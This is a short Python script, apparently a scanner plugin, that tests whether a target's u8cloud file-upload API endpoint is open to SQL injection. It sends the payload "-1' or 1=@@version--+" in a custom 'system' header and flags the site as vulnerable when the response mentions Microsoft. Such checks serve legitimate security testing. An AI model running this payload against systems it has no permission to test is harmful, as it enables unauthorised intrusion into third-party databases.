import requests
import urllib

def verify(url):
    relsult = {
        'name': '',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
        "system": "-1' or 1=@@version--+"
    }
    vurl = urllib.parse.urljoin(url, "/u8cloud/api/file/upload/base64")
    try:
        response = requests.get(vurl, headers=headers)
        if response.status_code == 200 and 'Microsoft' in response.text:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult

    except:
        return relsult